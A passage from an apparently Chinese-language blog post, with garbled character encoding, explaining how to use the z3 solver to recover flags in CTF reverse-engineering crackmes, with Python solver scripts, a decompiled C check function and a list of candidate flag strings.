class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result[a])</span><br><span class="line"><span class="built_in">print</span>(result[b])</span><br></pre></td></tr></table></figure><h2 id="z3è¯­æ³•">z3è¯­æ³•</h2><p>å¯¹äºæ™®é€šçš„è‡ªå®šä¹‰é€»è¾‘ï¼ˆå¸¦ä½ç§»ï¼Œå¼‚æˆ–ä¹‹ç±»çš„ä¸å¥½é€†å‘ï¼‰ï¼Œz3å¯ä»¥ç§’æ€</p><p>æ¯”å¦‚è¿™ä¹ˆå†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cmp = [<span class="number">0x66</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0xFD</span>, <span class="number">0x3C</span>, <span class="number">0x55</span>, <span class="number">0x90</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0xF6</span>, <span class="number">0x5D</span>, <span class="number">0xB1</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x81</span>, <span class="number">0xFD</span>, <span class="number">0x36</span>, <span class="number">0xA9</span>, <span class="number">0x1F</span>, <span class="number">0xA1</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x80</span>, <span class="number">0x8F</span>, <span class="number">0xCE</span>, <span class="number">0x77</span>, <span class="number">0xE8</span>, <span class="number">0x23</span>, <span class="number">0x9E</span>, <span class="number">0x27</span>, <span class="number">0x60</span>, <span class="number">0x2F</span>, <span class="number">0xA5</span>, <span class="number">0xCF</span>, <span class="number">0x1B</span>, <span class="number">0xBD</span>, <span class="number">0x32</span>, <span class="number">0xDB</span>, <span class="number">0xFF</span>, <span class="number">0x28</span>, <span class="number">0xA4</span>, <span class="number">0x5D</span>]</span><br><span class="line">f = Solver()</span><br><span class="line"></span><br><span class="line">flag,out = pini(<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = n = a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> pl(<span class="number">7</span>,<span class="number">6</span>):</span><br><span class="line">    a = <span class="number">6</span> * i + j</span><br><span class="line">    m = flag[a]</span><br><span class="line">    n = flag[a]</span><br><span class="line">    m = ~m</span><br><span class="line">    m &amp;= i * (j + <span class="number">2</span>)</span><br><span class="line">    n = n &amp; ~(i * (j + <span class="number">2</span>)) | m</span><br><span class="line">    a = <span class="number">7</span> * j + i</span><br><span class="line">    out[a] = n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">42</span>):</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">2</span> == <span class="number">1</span> ):</span><br><span class="line">        out[i] *= <span class="number">107</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out[i] += out[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    f.add(cmp[i]==out[i])</span><br><span class="line">isflag(f,flag)</span><br><span class="line">pcheck(f,flag)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯èƒ½é‡åˆ°è¦å¯¹z3å‹æ•°æ®åˆ¤æ–­çš„æƒ…å†µï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªé¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> out2[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-80h] BYREF</span></span><br><span class="line">  __int64 check[<span class="number">4</span>]; <span class="comment">// [rsp+80h] [rbp-40h]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+A0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+B4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  check[<span class="number">0</span>] = <span class="number">0x10C0105000D07</span>LL;</span><br><span class="line">  check[<span class="number">1</span>] = <span class="number">0xF0509000F050D00</span>LL;</span><br><span class="line">  check[<span class="number">2</span>] = <span class="number">0x701030305020003</span>LL;</span><br><span class="line">  check[<span class="number">3</span>] = <span class="number">0xC02070201020B07</span>LL;</span><br><span class="line">  v8 = <span class="number">514</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  len = <span class="number">17</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hi, PLZ input input&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  <span class="built_in">memset</span>(out2, <span class="number">0</span>, <span class="keyword">sizeof</span>(out2));</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">16</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)flag[i] &gt; <span class="string">&#x27;`&#x27;</span> &amp;&amp; (<span class="type">unsigned</span> __int8)flag[i] &lt;= <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">        flag[i] = (flag[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)flag[i] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; (<span class="type">unsigned</span> __int8)flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">        flag[i] = (flag[i] ^ <span class="number">0x4B</span>) - <span class="number">1</span>;</span><br><span class="line">      out2[<span class="number">2</span> * i] = (<span class="type">unsigned</span> __int8)flag[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      out2[<span class="number">2</span> * i + <span class="number">1</span>] = flag[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)check + <span class="number">2</span> * i) != out2[<span class="number">2</span> * (len - i) - <span class="number">2</span>]</span><br><span class="line">        &amp;&amp; *((_BYTE *)check + <span class="number">2</span> * i + <span class="number">1</span>) != out2[<span class="number">2</span> * (len - i) - <span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong wrong wrong&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;woc,you got it,flag is your input&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a Ha ? wrong1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»å‡½æ•°æ˜¯è¿™æ ·çš„ï¼Œè¿™é‡Œå®ƒä¸æ­¢å¯¹flagè¿›è¡Œåˆ†ç±»è®¨è®ºï¼Œè¿˜åœ¨è®¨è®ºåè¿›è¡Œè®¡ç®—ï¼šz3å‹å¯ä»¥ç›´æ¥è¿›è¡Œè®¡ç®—ï¼ŒåŒ…æ‹¬åŠ å’Œä¹˜ï¼Œå¯¹äºä½å‘é‡è¿˜å¯ä»¥å·¦å³ç§»ä»¥åŠå¼‚æˆ–ï¼Œä½†æ˜¯éƒ½ä¸èƒ½è¿›è¡Œåˆ¤æ–­å¤§å°ï¼Œå¦‚æœè¦è¿›è¡Œåˆ¤æ–­å¿…é¡»è¦åœ¨addä¸­åšåˆ¤æ–­ï¼Œæ¯”å¦‚åˆ¤æ–­ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.add(check[<span class="number">2</span> * i]==out3[<span class="number">2</span>*(<span class="built_in">len</span>-i-<span class="number">1</span>)])</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ ¹æ®è¿™é“é¢˜å†™ï¼Œè¿˜éœ€è¦Ifå‡½æ•°ï¼ˆZ3è‡ªå¸¦ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(condition,a,b)</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯ï¼šå¦‚æœæ¡ä»¶æˆç«‹ï¼Œè¯­å¥è§†ä¸ºaï¼Œå¦åˆ™è§†ä¸ºb</p><p>é‚£ä¹ˆå’Œaddç»“åˆèµ·æ¥çœ‹å°±æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f.add(If(And(out[i] &gt; <span class="number">0x60</span>, out[i] &lt;= <span class="number">0x7a</span>), out2[i] == (out[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>, <span class="literal">True</span>))</span><br><span class="line">f.add(If(And(out[i] &gt; <span class="number">0x40</span>, out[i] &lt;= <span class="number">0x5a</span>), out2[i] == (out[i] ^ <span class="number">0x4b</span>) - <span class="number">1</span>, <span class="literal">True</span>))</span><br></pre></td></tr></table></figure><p>å¦‚æœæ¡ä»¶æˆç«‹ï¼Œæ·»åŠ açº¦æŸï¼Œå¦åˆ™æ·»åŠ bçº¦æŸï¼Œè¿™é‡Œçš„bçº¦æŸæ’ä¸ºçœŸï¼Œè¡¨ç¤ºå¦‚æœæ¡ä»¶ä¸æˆç«‹å°±è·³è¿‡è¿™ä¸ªçº¦æŸã€‚å¯æ˜¯é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬çŸ¥é“out[i]æ˜¯ç”±flagåˆå§‹åŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´outæ˜¯z3ä½å‘é‡å‹ï¼Œä½†æ˜¯out2å‘¢ï¼Ÿå¦‚æœæŠŠè¿™é‡Œçš„out2è§†ä½œä¸€ä¸ªæ™®é€šåˆ—è¡¨ï¼Œè®©out[i]è®¡ç®—åçš„å€¼è¿”å›ç»™out2ï¼Œå¥½åƒä¹Ÿæ²¡é—®é¢˜ã€‚ä½†æ˜¯ï¼ï¼è¿™é‡Œçš„è¯­å¥å¹¶ä¸æ˜¯èµ‹å€¼è¯­å¥ï¼Œè€Œæ˜¯åˆ¤æ–­è¯­å¥ï¼Œæ˜¯ä¸€ä¸ª<code>çº¦æŸ</code>ï¼Œå¦‚æœè¿™é‡Œout2=34*[0],é‚£ä¹ˆå°±æ˜¯è®©out[i]è¿ç®—åçš„å€¼æ’ç­‰äº0çš„æ¡ä»¶æˆç«‹ï¼Œæ˜¾ç„¶è¿™æ˜¯æ— è§£çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªå˜é‡éƒ½å¿…é¡»æ˜¯ä½å‘é‡æ‰å¯ä»¥ï¼ŒåŒæ—¶ï¼Œä¸åº”è¯¥å¿˜äº†å¦‚æœä¸¤ä¸ªæ¡ä»¶å‡ä¸æˆç«‹ï¼Œå°±è¦è®©out=out2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.add(out2[i] == If(And(out[i] &gt; <span class="number">0x40</span>, out[i] &lt;= <span class="number">0x5a</span>), (out[i] ^ <span class="number">0x4b</span>) - <span class="number">1</span>,If(And(out[i] &gt; <span class="number">0x60</span>, out[i] &lt;= <span class="number">0x7a</span>), (out[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>, out[i])))</span><br></pre></td></tr></table></figure><p>è¿›è¡Œifçš„åµŒå¥—å®Œæˆè¿™ä¸ªæ•ˆæœ</p><p>ä¹‹åè¿˜è¦å¯¹flagç»§ç»­åšå˜æ¢å˜æˆæœ€åçš„æ•°ç»„ï¼Œä¸”æ•°ç»„å¤§å°ç¿»å€ï¼Œå¦‚æœåé¢çš„æ£€æŸ¥æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç›´æ¥åœ¨check==çš„æ—¶å€™å†™ï¼Œä½†æ˜¯ç”±äºè¿™é‡Œçš„æ¯”è¾ƒä¸æ˜¯å¾ˆç›´è§‚ï¼Œä¸å¦‚å†™å‡ºæ¥å˜æˆå•ç‹¬çš„åˆ—è¡¨å†æ¯”è¾ƒï¼Œè¿™æ—¶åˆè¦æ¶‰åŠåˆ°out2å˜æˆout3çš„é—®é¢˜äº†ï¼Œç”±äºè¿™ä¸ªæ˜¯ç›´æ¥èµ‹å€¼ï¼Œæ²¡æœ‰åˆ¤æ–­ï¼Œæ‰€ä»¥æ–¹ä¾¿èµ·è§ï¼Œç›´æ¥å†™èµ‹å€¼è¯­å¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">out3[<span class="number">2</span>*i] = LShR(out2[i], <span class="number">4</span>)</span><br><span class="line">out3[<span class="number">2</span>*i+<span class="number">1</span>] = out2[i] &amp; <span class="number">0xf</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸¤ä¸ªä¾‹å­å¯ä»¥å‘ç°ï¼Œå½“æƒ³è¦èµ‹å€¼æ—¶ï¼Œå¦‚æœè¦å¯¹z3å‹å˜é‡è¿›è¡Œåˆ¤æ–­/æ¯”è¾ƒï¼Œå°±å¿…é¡»ç”¨addè¡¨è¾¾å¼ï¼Œåœ¨å…¶ä¸­ï¼Œä¸ºäº†è¾¾æˆèµ‹å€¼æ•ˆæœï¼Œå¿…é¡»æ–°å»ºä¸€ä¸ªz3é‡æ‰å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯å¦‚æœæ˜¯ç›´æ¥èµ‹å€¼ï¼Œåˆ™ç›´æ¥å¯¹åˆ—è¡¨èµ‹å€¼å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">check = [<span class="number">0x07</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x02</span>]</span><br><span class="line">flag,out = pini(<span class="number">17</span>)</span><br><span class="line">out2 = [BitVec(<span class="string">&#x27;out2[%2d]&#x27;</span> % i , <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">34</span>)]</span><br><span class="line">out3 = [<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">17</span></span><br><span class="line">f = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line"></span><br><span class="line">    f.add(out2[i] == If(And(out[i] &gt; <span class="number">0x40</span>, out[i] &lt;= <span class="number">0x5a</span>), (out[i] ^ <span class="number">0x4b</span>) - <span class="number">1</span>,</span><br><span class="line">                     If(And(out[i] &gt; <span class="number">0x60</span>, out[i] &lt;= <span class="number">0x7a</span>), (out[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>, out[i])))</span><br><span class="line"></span><br><span class="line">    out3[<span class="number">2</span>*i] = LShR(out2[i], <span class="number">4</span>)</span><br><span class="line">    out3[<span class="number">2</span>*i+<span class="number">1</span>] = out2[i] &amp; <span class="number">0xf</span></span><br><span class="line">isflag(f,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    f.add(check[<span class="number">2</span> * i]==out3[<span class="number">2</span>*(<span class="built_in">len</span>-i-<span class="number">1</span>)])</span><br><span class="line">    f.add(check[<span class="number">2</span> * i + <span class="number">1</span>]==out3[<span class="number">2</span>*(<span class="built_in">len</span>-i-<span class="number">1</span>)+<span class="number">1</span>])</span><br><span class="line">pcheck(f,flag)</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span 